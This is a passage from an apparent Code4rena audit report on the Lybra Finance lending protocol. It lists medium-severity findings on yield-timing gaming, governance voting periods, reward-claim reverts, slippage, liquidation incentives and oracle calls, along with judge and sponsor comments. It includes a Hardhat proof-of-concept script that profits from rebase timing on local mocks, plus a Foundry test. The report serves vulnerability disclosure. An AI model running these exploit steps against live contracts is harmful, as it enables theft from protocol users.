4. Right after Bob's rebase gets executed, Alice calls `rigidRedemption` (to repay the full debt) followed by a withdraw (to get the difference out), getting most of the stETH back and some EUSD.
5. Since the stETH charged by the withdraw function is left in the vault, if they want, Alice can now call `excessIncomeDistribution` to get the tokens back, using the EUSD recived by rebasing, and leaving with slightly more stETH and some EUSD, that they got for free; leaving 0 debts and 0 assets deposited, having left their tokens in the vault for a few seconds.

Here is an hardhat script that shows the scenario above in javascript (each step is highlighted in the comments and it will print all the balances to the console).
Before running it you'll have to install the `'@openzeppelin/test-helpers'` package:

<details>

    const {ethers} = require("hardhat");
    const {
            constants,
            expectRevert,
        } = require('@openzeppelin/test-helpers');//questo va installato
    const { expect } = require("chai");
    async function main() {
      this.accounts = await ethers.getSigners()
            this.owner = this.accounts[0].address
            console.log("Deployng contracts...")
            const goerliEndPoint = '0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23'
            const goerliChainId = 10121

            const oracle = await ethers.getContractFactory("mockChainlink")
            const stETH = await ethers.getContractFactory("stETHMock")
            const EUSDMock = await ethers.getContractFactory("EUSD")
            const configurator = await ethers.getContractFactory("Configurator")
            const LybraStETHDepositVault = await ethers.getContractFactory("LybraStETHDepositVault")
            const GovernanceTimelock = await ethers.getContractFactory("GovernanceTimelock")
            const EUSDMiningIncentives = await ethers.getContractFactory("EUSDMiningIncentives")
            const esLBRBoost = await ethers.getContractFactory("esLBRBoost")
            const LBR = await ethers.getContractFactory("LBR")
            const esLBR = await ethers.getContractFactory("esLBR")
            const PeUSDMainnet = await ethers.getContractFactory("PeUSDMainnet")
            const ProtocolRewardsPool = await ethers.getContractFactory("ProtocolRewardsPool")
            const mockCurvePool = await ethers.getContractFactory("mockCurve")//
            const mockUSDC = await ethers.getContractFactory("mockUSDC")
            const lbrOracleMock = await ethers.getContractFactory("mockLBRPriceOracle")//
            
            this.oracle = await oracle.deploy()

            this.lbrOracleMock = await lbrOracleMock.deploy()

            this.stETHMock = await stETH.deploy()

            this.GovernanceTimelock = await GovernanceTimelock.deploy(1,[this.owner],[this.owner],this.owner);


            this.esLBRBoost = await esLBRBoost.deploy()

            this.usdc = await mockUSDC.deploy()

            this.mockCurvePool = await mockCurvePool.deploy()

            this.configurator = await configurator.deploy(this.GovernanceTimelock.address, this.mockCurvePool.address)


            this.LBR = await LBR.deploy(this.configurator.address, 8, goerliEndPoint)
      
            this.esLBR = await esLBR.deploy(this.configurator.address)


            this.EUSDMock = await EUSDMock.deploy(this.configurator.address)

            await this.configurator.initToken(this.EUSDMock.address, constants.ZERO_ADDRESS)//

            this.EUSDMiningIncentives = await EUSDMiningIncentives.deploy(this.configurator.address, this.esLBRBoost.address, this.oracle.address, this.lbrOracleMock.address)

            this.ProtocolRewardsPool = await ProtocolRewardsPool.deploy(this.configurator.address)

            this.stETHVault = await LybraStETHDepositVault.deploy(this.configurator.address, this.stETHMock.address, this.oracle.address)

            this.PeUSDMainnet = await PeUSDMainnet.deploy(this.configurator.address, 8, goerliEndPoint)

            await this.mockCurvePool.setToken(this.EUSDMock.address, this.usdc.address)
            await this.configurator.setMintVault(this.stETHVault.address, true);
            await this.configurator.setPremiumTradingEnabled(true);
            await this.configurator.setMintVaultMaxSupply(this.stETHVault.address, ethers.utils.parseEther("10000000000"));
            await this.configurator.setBorrowApy(this.stETHVault.address, 200);
            await this.configurator.setEUSDMiningIncentives(this.EUSDMiningIncentives.address)

            await this.EUSDMiningIncentives.setToken(this.LBR.address, this.esLBR.address)
            await this.ProtocolRewardsPool.setTokenAddress(this.esLBR.address, this.LBR.address, this.esLBRBoost.address);







            ///////////////////////////////////////////POC////////////////////////////////////////////////////////////

            //random users, mints stETH and deposits them (only 1 in the script for simplicity)
            await stETHMock.connect(accounts[2]).submit(accounts[2].address, {value:ethers.utils.parseEther("1000") });
            await stETHMock.connect(accounts[2]).approve(this.stETHVault.address, ethers.constants.MaxUint256)
            await stETHVault.connect(accounts[2]).depositAssetToMint(await stETHMock.balanceOf(accounts[2].address),ethers.utils.parseEther("10000"));
           
            //time passes generathing stETH yield
            await network.provider.send("evm_increaseTime", [6500])
            await network.provider.send("evm_mine")

            //user 3 balances before exploit 
            await stETHMock.connect(accounts[3]).submit(accounts[3].address, {value:ethers.utils.parseEther("100") });
            //timestamp
            const blockNumBefore = await ethers.provider.getBlockNumber();
            const blockBefore = await ethers.provider.getBlock(blockNumBefore);
            const timestampBefore = blockBefore.timestamp;
            console.log("Timestamp before the exploit: " + timestampBefore)
            //stETH balance
            const sthETHBalanceBefore = await stETHMock.balanceOf(accounts[3].address)
            console.log("sthETHBalance before the exploit: " +sthETHBalanceBefore)
            //EUSD shares
            const EUSDSharesBefore = await this.EUSDMock.sharesOf(accounts[3].address)
            console.log("EUSD shares before the exploit: " + EUSDSharesBefore)
            //EUSD balance 
            const EUSDBalanceBefore = await this.EUSDMock.balanceOf(accounts[3].address)
            console.log("EUSD balance before the exploit: " + EUSDBalanceBefore)
            //Deposited assets
            const depositedAssetBefore = await stETHVault.depositedAsset(accounts[3].address)
            console.log("Deposited assets before the exploit: " + depositedAssetBefore)
            //Borrowed amount
            const borrowedBefore = await stETHVault.getBorrowedOf(accounts[3].address)
            console.log("Borrowed amount before the exploit: " + borrowedBefore)

            //right before somene calls the rebasde function (excessIncomeDistribution) user3 deposits into the vault
            const depositedAmount = ethers.utils.parseEther("1.0")
            await stETHMock.connect(accounts[3]).approve(this.stETHVault.address, ethers.constants.MaxUint256)
            await stETHVault.connect(accounts[3]).depositAssetToMint(depositedAmount,ethers.utils.parseEther("1000.0"))

            //someone call excessIncomeDistribution causing the rebase to distribute the yield to users
            await stETHVault.connect(accounts[2]).excessIncomeDistribution(ethers.utils.parseEther("0.01"))
            console.log("Alice deposits before rebase and withdraws immediately after")

            //right after the rebase user3 redeems all the necessary tokens
            await this.configurator.connect(accounts[3]).becomeRedemptionProvider(true)
            await stETHVault.connect(accounts[3]).rigidRedemption(accounts[3].address, await stETHVault.getBorrowedOf(accounts[3].address))
            await stETHVault.connect(accounts[3]).withdraw(accounts[3].address,await stETHVault.depositedAsset(accounts[3].address));
            await stETHVault.connect(accounts[3]).excessIncomeDistribution(ethers.utils.parseEther("0.01"))

           
            //user3 balances after exploit
            //timestamp
            const blockNumAfter = await ethers.provider.getBlockNumber();
            const blockAfter = await ethers.provider.getBlock(blockNumAfter);
            const timestampAfter = blockAfter.timestamp;
            console.log("Timestamp after the exploit: " + timestampAfter)
            //stETH balance
            const sthETHBalanceAfter = await stETHMock.balanceOf(accounts[3].address)
            console.log("sthETH balance after the exploit: " +sthETHBalanceAfter)
            //EUSD shares
            const EUSDSharesAfter = await this.EUSDMock.sharesOf(accounts[3].address)
            console.log("EUSD shares after the exploit: " + EUSDSharesAfter)
            //EUSD balance 
            const EUSDBalanceAfter = await this.EUSDMock.balanceOf(accounts[3].address)
            console.log("EUSD balance after the exploit: " + EUSDBalanceAfter)
            //Deposited assets
            const depositedAssetAfter = await stETHVault.depositedAsset(accounts[3].address)
            console.log("Deposited assets after the exploit: " + depositedAssetAfter)
            //Borrowed amount
            const borrowedAfter = await stETHVault.getBorrowedOf(accounts[3].address)
            console.log("Borrowed amount after the exploit: " + borrowedAfter)

            expect(sthETHBalanceAfter > sthETHBalanceBefore)

    }

    // We recommend this pattern to be able to use async/await everywhere
    // and properly handle errors.
    main().catch((error) => {
      console.error(error);
      process.exitCode = 1;
    });

It will log the following content to the console:

    Deployng contracts...
    Timestamp before the exploit: 1688138231
    sthETHBalance before the exploit: 99999999999999999999
    EUSD shares before the exploit: 0
    EUSD balance before the exploit: 0
    Deposited assets before the exploit: 0
    Borrowed amount before the exploit: 0
    Alice deposits before rebase and withdraws immediately after
    Timestamp after the exploit: 1688138238
    sthETH balance after the exploit: 100000319476188886835
    EUSD shares after the exploit: 320852235386255949
    EUSD balance after the exploit: 321329019285990239
    Deposited assets after the exploit: 0
    Borrowed amount after the exploit: 0

</details>

### Recommended Mitigation Steps

The same timelock logic that is applied to the withdraw function could be applied to `rigidRedemption`, making this type of interaction unprofitable.

### Assessed type

Timing

**[LybraFinance disputed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1635597408):**
 > There is a 0.5% fee for redemptions, which offsets the potential gains from such operations.

**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1650757930):**
 > @LybraFinance - can you comment on why you believe the test is not showing that fee outweighing the benefit?

**[LybraFinance confirmed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1655277926):**
 > Because in step three, there are additional fees involved when the user performs a withdraw, so it's not possible to completely avoid losses. This situation does exist, but we consider it a moderate-risk issue.

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1655652712)**

***

## [[M-16] Due to inappropriately short `votingPeriod`  and `votingDelay`, it is nearly impossible for the governance to function correctly.](https://github.com/code-423n4/2023-06-lybra-findings/issues/268)
*Submitted by [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/268), also found by [josephdara](https://github.com/code-423n4/2023-06-lybra-findings/issues/966), [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/939), [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/938), [0xhacksmithh](https://github.com/code-423n4/2023-06-lybra-findings/issues/893), [cccz](https://github.com/code-423n4/2023-06-lybra-findings/issues/685), [ktg](https://github.com/code-423n4/2023-06-lybra-findings/issues/674), [CrypticShepherd](https://github.com/code-423n4/2023-06-lybra-findings/issues/546), [squeaky\_cactus](https://github.com/code-423n4/2023-06-lybra-findings/issues/346), [0xnev](https://github.com/code-423n4/2023-06-lybra-findings/issues/320), [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/228), [LuchoLeonel1](https://github.com/code-423n4/2023-06-lybra-findings/issues/227), and [T1MOH](https://github.com/code-423n4/2023-06-lybra-findings/issues/16)*

### Proof of Concept

When making proposals with the [`Governor`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/Governor.sol#L299-L308) contract OZ uses `votingPeriod`.

```jsx
        uint256 snapshot = currentTimepoint + votingDelay();
        uint256 duration = votingPeriod();

        _proposals[proposalId] = ProposalCore({
            proposer: proposer,
            voteStart: SafeCast.toUint48(snapshot),//@audit votingDelay() for when the voting starts
            voteDuration: SafeCast.toUint32(duration),//@audit votingPeriod() for the duration
            executed: false,
            canceled: false
        });
```

But currently, Lybra has implemented the wrong amounts for bolt [`votingPeriod`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L143-L145) and [`votingDelay`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L147-L149), which means proposals from the governance will be nearly impossible to be voted on.

```jsx
    function votingPeriod() public pure override returns (uint256){
         return 3;//@audit this should be time in blocks 
    }

     function votingDelay() public pure override returns (uint256){
         return 1;//@audit this should be time in blocks 
    }
```

### HH PoC

<https://gist.github.com/0x3b33/dfd5a29d5fa50a00a149080280569d12>

### Tools Used

Manual Review

### Recommended Mitigation Steps

You can implement it as OZ suggests in their [examples](https://docs.openzeppelin.com/contracts/4.x/governance)

```jsx
    function votingDelay() public pure override returns (uint256) {
        return 7200; // 1 day
    }

    function votingPeriod() public pure override returns (uint256) {
        return 50400; // 1 week
    }
```

### Assessed type

Governance

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/268#issuecomment-1635607289)**

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/268#issuecomment-1650817455)**

***

## [[M-17] If `ProtocolRewardsPool` is insufficient in EUSD, users will not be able to claim any rewards](https://github.com/code-423n4/2023-06-lybra-findings/issues/223)
*Submitted by [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/223), also found by [Jorgect](https://github.com/code-423n4/2023-06-lybra-findings/issues/720), [HE1M](https://github.com/code-423n4/2023-06-lybra-findings/issues/497), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/434), [Brenzee](https://github.com/code-423n4/2023-06-lybra-findings/issues/362), [kutugu](https://github.com/code-423n4/2023-06-lybra-findings/issues/238), and [Bughunter101](https://github.com/code-423n4/2023-06-lybra-findings/issues/161)*

If [`ProtocolRewardsPool`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol) is insufficient in EUSD, but has enough PeUSD to give rewards, it still reverts due to wrong `if()` statement, thus it is  unable to send the rewards to users.

### Proof of Concept

Users have just emptied [`ProtocolRewardsPool`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol) out of EUSD, by claiming rewards with  `getReward`. Now the protocol has a new distribution of PeUSD tokens, with `LybraConfigurator.distributeRewards`, but when users try to claim their rewards, [`getReward`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L190-L218) reverts because of this:

```jsx
   function getReward() external updateReward(msg.sender) {
        uint reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            IEUSD EUSD = IEUSD(configurator.getEUSDAddress());//get the address
            uint256 balance = EUSD.sharesOf(address(this));//get the balance == 
//@aduit here eUSDShare = balance >= reward-false => reward - balance => rewards - 0 | eUSDShare = reward
            uint256 eUSDShare = balance >= reward ? reward : reward - balance;
//here it tries to send the rewards amount, but it reverts since it has not tokens 
            EUSD.transferShares(msg.sender, eUSDShare);

```

Because of the constant revert, users are not able to claim their rewards and need to wait for EUSD distribution. The other bad thing is that the PeUSD is un-calimable to most extent. Again, because of the line bellow, if:

*   Protocol has 40e18 EUSD and 100e18 PeUSD.
*   UserA tries to claim their rewards, that are 100e18 in rewards tokens.

```jsx
//eUSDShare = balance >= reward-false => reward - balance => 100e18 - 40e18 => eUSDShare = 60e18 
uint256 eUSDShare = balance >= reward ? reward : reward - balance;
//again reverts, because contract has 40, whily trying to send 60
EUSD.transferShares(msg.sender, eUSDShare);
```

Now PeUSD is un-claimable and remains in the contract.

### Foundry PoC

```jsx
    function test_no_EUSD() public {
        //make 2 random users
        deal(address(lbr), user1, 1000e18);
        deal(address(lbr), user2, 4000e18);

        //stake for bolt of them
        vm.prank(user1);
        rewardsPool.stake(1000e18); 

        vm.prank(user2);
        rewardsPool.stake(4000e18);   

        //get some PeUSD in the config and call distributeRewards() to send it to the pool
        //@notice here we don't send any EUSD => rewardsPool has 0 EUSD
        deal(address(PeUSD),address(configurator),1e21);
        configurator.distributeRewards();

        //to make sure the balance is sent
        PeUSD.balanceOf(address(rewardsPool));

        //user rewards is actually 2e17 per 1e18 => 2e20 total for user1
        vm.prank(user1);
        //but here reverts, because it is unable to send any EUSD
        rewardsPool.getReward();
        console.log(rewardsPool.earned(user1));
        console.log("pEUSD user1: ", PeUSD.balanceOf(user1));
        console.log("pEUSD pool : ", PeUSD.balanceOf(address(rewardsPool)));
        console.log();
    }
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

Update the [`if`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol) as:

```jsx
-  uint256 eUSDShare = balance >= reward ? reward : reward - balance;
+  uint256 eUSDShare = balance >= reward ? reward : balance;
```

### Assessed type

Math

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/223#issuecomment-1656234021)**

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/223#issuecomment-1656707328)**

***

## [[M-18] Volatile prices and lack of checks on `rigidRedemption()` can cause users to purchase stETH at unwanted prices](https://github.com/code-423n4/2023-06-lybra-findings/issues/221)
*Submitted by [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/221)*

### Impact

Volatile prices can cause issue when users try to do [`rigidRedemption`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168).

### Proof of Concept

Volatile prices can cause slippage loss when users use `rigidRedemption()`. This function takes PeUSD (stable coin) amount and converts it to WstETH/stETH (variable price). Unfortunately, `rigidRedemption()` does not include `timestamp` or `minAmount` received, meaning this trade can be executed later in time and at a different price than user previously expected.

**Example:**

*   Provider has 100 **wstETH** and **wstETH** price is `$`2000.
*   User wants to buy 10 **wstETH** and has 20,000 in PeUSD, so they calls [`rigidRedemption`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168).
*   Now, due to congestion on **ETH** and volatile prices, the transaction could remain stuck in the mempool for a long time.
*   Finally, the transaction gets executed, but now the wstETH price is `$`2100, not the original `$`2000, so the user receives 9.52 **wstETH** instead of 10 (not counting fees)!

### Recommended Mitigation Steps

Because of this scenario and others like it, it is recommended to use some sort of slippage protection when users execute trades.

```jsx
    function rigidRedemption(address provider, uint256 eusdAmount,uint256 minAmountReceived) external virtual {
        depositedAsset[provider] -= collateralAmount;
        totalDepositedAsset -= collateralAmount;
+       require(minAmountReceived <= collateralAmount);
        collateralAsset.transfer(msg.sender, collateralAmount);
        emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);
    }
```

### Assessed type

MEV

**[LybraFinance disagreed with severity and confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/221#issuecomment-1653062772)**

***

## [[M-19] `CLOCK_MODE()` will not work properly for Arbitrum or Optimism due to `block.number`](https://github.com/code-423n4/2023-06-lybra-findings/issues/114)
*Submitted by [IceBear](https://github.com/code-423n4/2023-06-lybra-findings/issues/114), also found by [btk](https://github.com/code-423n4/2023-06-lybra-findings/issues/694)*

### Proof of Concept

According to [Arbitrum Docs](https://developer.offchainlabs.com/time), `block.number` returns the most recently synced L1 block number. Once per minute, the block number in the `Sequencer` is synced to the actual L1 block number. Using `block.number` as a clock can lead to inaccurate timing.

It also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block.

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L152>

### Recommended Mitigation Steps

Use `block.timestamp` rather than `block.number`

### Assessed type

Timing

**[LybraFinance commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/114#issuecomment-1639775144):**
 > The governance contract only exists on the Ethereum mainnet.

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/114#issuecomment-1656708522)**

***

## [[M-20] Fixed reward percentage for liquidators in the eUSD vault may cause a liquidation crisis](https://github.com/code-423n4/2023-06-lybra-findings/issues/72)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/72)*

To not lose generality, the same issue is present in the `LybraPEUSDVaultBase` contract.

Liquidations are essential for a lending protocol to maintain the over-collateralization of the protocol. Hence, when a liquidation happens, it should increment the collateral ratio of the liquidated position (make it healthier).

The `LybraEUSDVaultBase` contract has a function named `liquidation`, which is used to liquidate users whose collateral ratio is below the bad collateral ratio, which for the eUSD Vault is 150%. This function incentives liquidators with a fixed reward of 10% of the collateral being liquidated. However, the issue with the fixed compensation is that it will cause a position to get unhealthier during a liquidation when the collateral ratio is 110% or smaller.

### Proof of Concept

Take the following example:

*   USD / ETH price = 1500
*   Collateral amount = 2 ether
*   Debt = 2779 eUSD

The data above will give us a collateral ratio for the position of: 107.9%. The liquidator liquidates the max amount possible, which is 50% of the collateral, one ether, and takes 10% extra for its services; the final collateral ratio will be:

`((2 - 1.1) * 1500) / (2779 - 1500) = 1.055`

The position got unhealthier after the liquidation, from a collateral ratio of 107.9% to 105%. The process can be repeated until it is no longer profitable for the liquidator leading the protocol to accumulate bad debt.

### Justification

I landed medium on this finding for the following reasons:

*   It has the requirement that the position must have a collateral ratio lower than 110%, which means that it was not liquidated before it reached that point.

*   Even though the above point is required for this to become an issue, the position in the example was still over-collateralized (\~108%). It should not be possible to liquidate an over-collateralized position and have the consequence of making it unhealthier.

### Tools Used

Manual Review

### Recommended Mitigation Steps

When a position has a collateral ratio below 110%, the reward percentage should be adjusted accordingly instead of a fixed reward of 10%.

### Assessed type

Math

**[LybraFinance disagreed with severity and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/72#issuecomment-1639559653):**
 > Liquidation due to a collateral ratio below 110% results in a further decrease in the collateral ratio. When the collateral ratio falls below 100%, the liquidation outcome remains the same. In practice, liquidation occurs when the collateral ratio reaches 150%, making it unlikely to have an excessively low collateral ratio.

**[0xean (judge) decreased severity to Low](https://github.com/code-423n4/2023-06-lybra-findings/issues/72#issuecomment-1654796250)**

**[0xRobocop (warden) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/72#issuecomment-1656790664):**
 > I think this issue was misjudged:
> 
> The issue describes how an over-collateralized position between 101% and 109% (inclusive) gets unhealthier with each liquidation. From my knowledge, there is no CDP protocol that allows this behavior since instead of helping the protocol increment the total collateral ratio, it accelerates to go to lower levels.
> 
> I think this is a clear medium issue because it has the requirement of a position to reach a CR of 109% which may not happen, but still it cannot be guaranteed that it will never happen and the protocol should handle these cases.
> 
> Medium issue definition:
> 
> > Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
> 
> - Stated assumption by the protocol: A position will never reach 109%.
> - External requirement: A position reaching 109% which cannot be guaranteed that will never happen.
> - Impact: Liquidations in a CDP protocol should make the protocol healthier when the positions are still over-collateralized, which in the case of this protocol it does not happen in certain conditions.
> 

**[0xean (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/72#issuecomment-1656934616):**
 > Thanks @0xRobocop for making your case, I think its on the cusp between being a design decision (which I agree is a sub optimal design choice) and a M severity issue.  
> 
> Liquidation's cascading into to more liquidations is never a good outcome and I think you are correct that this does lead to that.  Lets get some sponsor comment and for the moment, I will upgrade to M.

**[LybraFinance confirmed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/72#issuecomment-1659661178):**
 > Although we have been using this design since V1, we have to admit, liquidation's cascading into to more liquidations is never a good outcome. Therefore, we have decided to modify this logic. Thank you for your valuable suggestions!

***

## [[M-21] Liquidation won't work when bad and safe collateral ratio are set to default values](https://github.com/code-423n4/2023-06-lybra-findings/issues/44)
*Submitted by [T1MOH](https://github.com/code-423n4/2023-06-lybra-findings/issues/44), also found by [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/926), [KupiaSec](https://github.com/code-423n4/2023-06-lybra-findings/issues/775), [kenta](https://github.com/code-423n4/2023-06-lybra-findings/issues/752), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/267), and [y51r](https://github.com/code-423n4/2023-06-lybra-findings/issues/204)*

`getBadCollateralRatio()` will revert because of underflow, if `vaultBadCollateralRatio[pool]` and `vaultSafeCollateralRatio[pool]` are set to 0 (i.e. using default ratios 150% and 130% accordingly).
It blocks liquidation flow.

### Proof of Concept

1e19 is decremented from value `vaultSafeCollateralRatio[pool]`:

```solidity
    function getBadCollateralRatio(address pool) external view returns(uint256) {
        if(vaultBadCollateralRatio[pool] == 0) return vaultSafeCollateralRatio[pool] - 1e19;
        return vaultBadCollateralRatio[pool];
    }
```

However, `vaultSafeCollateralRatio[pool]` can be set to 0, which should mean 160%:

```solidity
    function getSafeCollateralRatio(
        address pool
    ) external view returns (uint256) {
        if (vaultSafeCollateralRatio[pool] == 0) return 160 * 1e18;
        return vaultSafeCollateralRatio[pool];
    }
```

As a result, incorrect accounting block liquidation when using default values.

Also, I think this is similar issue, but different impact; therefore, described in this issue. `BadCollateralRatio` can't be set when `SafeCollateralRatio` is default, as `newRatio` must be less than 10%:

<https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L127>

```solidity
    function setBadCollateralRatio(address pool, uint256 newRatio) external onlyRole(DAO) {
        require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, "LNA");
        ...
    }
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

Instead of internal accessing variables, use functions `getSafeCollateralRatio()` and `getBadCollateralRatio()` in all the occurences because variables can be zero.

### Assessed type

Invalid Validation

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/44#issuecomment-1656232136)**

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/44#issuecomment-1656709539)**

***

## [[M-22] Incorrect function call in `LybraRETHVault`'s `getAssetPrice`](https://github.com/code-423n4/2023-06-lybra-findings/issues/27)
*Submitted by [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/27), also found by [MrPotatoMagic](https://github.com/code-423n4/2023-06-lybra-findings/issues/993), [Arz](https://github.com/code-423n4/2023-06-lybra-findings/issues/992), [HE1M](https://github.com/code-423n4/2023-06-lybra-findings/issues/949), [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/920), [0xMAKEOUTHILL](https://github.com/code-423n4/2023-06-lybra-findings/issues/894), [Toshii](https://github.com/code-423n4/2023-06-lybra-findings/issues/847), [qpzm](https://github.com/code-423n4/2023-06-lybra-findings/issues/812), [qpzm](https://github.com/code-423n4/2023-06-lybra-findings/issues/811), [a3yip6](https://github.com/code-423n4/2023-06-lybra-findings/issues/801), [Iurii3](https://github.com/code-423n4/2023-06-lybra-findings/issues/718), [LokiThe5th](https://github.com/code-423n4/2023-06-lybra-findings/issues/693), [Cryptor](https://github.com/code-423n4/2023-06-lybra-findings/issues/548), [LaScaloneta](https://github.com/code-423n4/2023-06-lybra-findings/issues/545), [Qeew](https://github.com/code-423n4/2023-06-lybra-findings/issues/531), [Qeew](https://github.com/code-423n4/2023-06-lybra-findings/issues/528), [bart1e](https://github.com/code-423n4/2023-06-lybra-findings/issues/505), [azhar](https://github.com/code-423n4/2023-06-lybra-findings/issues/488), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/460), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/458), [0xnacho](https://github.com/code-423n4/2023-06-lybra-findings/issues/454), [0xnacho](https://github.com/code-423n4/2023-06-lybra-findings/issues/447), [Co0nan](https://github.com/code-423n4/2023-06-lybra-findings/issues/436), [Co0nan](https://github.com/code-423n4/2023-06-lybra-findings/issues/432), [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/418), [hl\_](https://github.com/code-423n4/2023-06-lybra-findings/issues/411), [0xgrbr](https://github.com/code-423n4/2023-06-lybra-findings/issues/391), [0xkazim](https://github.com/code-423n4/2023-06-lybra-findings/issues/310), [SovaSlava](https://github.com/code-423n4/2023-06-lybra-findings/issues/302), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/282), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/281), [CrypticShepherd](https://github.com/code-423n4/2023-06-lybra-findings/issues/248), [CrypticShepherd](https://github.com/code-423n4/2023-06-lybra-findings/issues/247), [LuchoLeonel1](https://github.com/code-423n4/2023-06-lybra-findings/issues/226), [Vagner](https://github.com/code-423n4/2023-06-lybra-findings/issues/189), [kutugu](https://github.com/code-423n4/2023-06-lybra-findings/issues/149), [peanuts](https://github.com/code-423n4/2023-06-lybra-findings/issues/140), [smaul](https://github.com/code-423n4/2023-06-lybra-findings/issues/129), and [jnrlouis](https://github.com/code-423n4/2023-06-lybra-findings/issues/23)*

The incorrect function call in the code results in the inability to calculate the asset price properly. This will halt all operations associated with the asset pricing, disrupting the functioning of the entire system.

### Proof of Concept

`LybraRETHVault`'s `getAssetPrice` method currently makes a call to a non-existent function in the rETH contract, `getExchangeRatio()`. The issue appears to be a misunderstanding or miscommunication, as the rETH contract does not provide a `getExchangeRatio()` function. This leads to a failure in the asset price calculation.

```solidity
    function getAssetPrice() public override returns (uint256) {
        return (_etherPrice() * IRETH(address(collateralAsset)).getExchangeRatio()) / 1e18;
    }
```

The correct function to call is `getExchangeRate()`, which exists in the rETH contract and provides the exchange rate necessary to determine the asset price.

<https://etherscan.deth.net/address/0xae78736Cd615f374D3085123A210448E74Fc6393>
![](https://i.imgur.com/emneslX.png)

<https://etherscan.deth.net/address/0xae78736Cd615f374D3085123A210448E74Fc6393>
![](https://i.imgur.com/qk9Ae0y.png)

### Tools Used

Manual review

### Recommended Mitigation Steps

To resolve this issue, it is recommended to replace the non-existent function call `getExchangeRatio()` with the correct function `getExchangeRate()`. This correction will ensure that the `getAssetPrice()` method retrieves the correct exchange rate from the rETH contract, allowing the system to calculate the asset price accurately.

```solidity
    function getAssetPrice() public override returns (uint256) {
        return (_etherPrice() * IRETH(address(collateralAsset)).getExchangeRate()) / 1e18;
    }
```

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/27#issuecomment-1639518818)**

***

## [[M-23] The relation between the safe collateral ratio and the bad collateral ratio for the PeUSD vaults is not enforced correctly](https://github.com/code-423n4/2023-06-lybra-findings/issues/3)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/3), also found by [josephdara](https://github.com/code-423n4/2023-06-lybra-findings/issues/950), [Kenshin](https://github.com/code-423n4/2023-06-lybra-findings/issues/782), [gs8nrv](https://github.com/code-423n4/2023-06-lybra-findings/issues/574), [caventa](https://github.com/code-423n4/2023-06-lybra-findings/issues/517), [smaul](https://github.com/code-423n4/2023-06-lybra-findings/issues/446), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/276), and [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/272)*

### Lines of code

